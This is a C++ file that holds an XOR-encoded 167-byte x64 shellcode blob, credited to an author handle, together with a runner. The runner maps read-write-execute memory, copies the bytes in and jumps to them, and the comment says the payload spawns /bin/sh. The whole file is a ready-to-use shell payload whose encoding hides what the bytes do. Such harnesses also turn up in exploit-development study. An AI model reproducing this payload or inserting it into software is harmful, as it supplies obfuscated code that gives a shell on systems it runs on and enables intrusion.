#include <iostream>
#include <sys/mman.h>
#include <unistd.h>
#include <cstring>
using namespace std;

/*
- Shellcode : 167 Bytes
- Execute : /bin/sh (Get Shell)
- Arch : x64 Bits
- Author : Hamza (hamza-kernel)
*/

unsigned char shellcode[] = 
"\x48\x31\xc9\x48\x81\xe9\xf0\xff\xff\xff\x48\x8d\x05\xef"
"\xff\xff\xff\x48\xbb\x43\x1c\x0b\xb3\x54\x1a\x5a\xdd\x48"
"\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x0b\x2d\xc2"
"\xfb\xd5\xf3\xaf\x22\xbc\xe3\x43\x3e\x51\xf5\xa5\x22\xbc"
"\x54\xb0\xf3\x83\xa2\x79\xbb\xa0\xc4\xc0\xfb\x65\x42\x7d"
"\x95\x6e\xe4\xf4\x4c\xab\xf8\xae\xd5\xa5\x6d\x60\x54\x5e"
"\x38\x6e\x62\x6b\xec\xa5\xd0\x58\x3d\x6e\x62\xdc\x1f\x67"
"\x2a\x2f\x8a\xdc\xe3\xa9\xaf\x60\xe4\xef\xe5\xd9\xb0\x6c"
"\x5b\xd7\x2a\x55\x36\x96\xda\x23\x8e\x0c\xc5\xa5\xba\xb6"
"\x62\x95\xbc\x31\xf4\xd8\xaf\xb6\x4f\x6f\xb8\x3b\xf9\x62"
"\xc1\xde\x62\x0c\xc3\x07\xc2\xe4\xe6\xad\x0a\x0c\xba\x32"
"\xff\xd4\xa3\xe5\x3a\x03\xe9\x65\xab\x8a\xc9\x91\xdd";

int main(){
    cout << "Shellcode length: " << sizeof(shellcode)-1 << " Bytes\n";

    //Allocate execatable memory
    void* exec_mem = mmap(0, sizeof(shellcode),
    PROT_READ|PROT_WRITE|PROT_EXEC,
    MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);

    if (exec_mem == MAP_FAILED){
        perror("mmap failed");
        return 1;
    }

    //Copy shellcode to executable memory
    memcpy(exec_mem, shellcode, sizeof(shellcode));

    //Execute the shellcode
    cout << "Executing shellcode...\n";
    ((void(*)())exec_mem)();

    //Cleanup (won't reach here if shellcode succeeds)
    munmap(exec_mem, sizeof(shellcode));
    return 0;
}
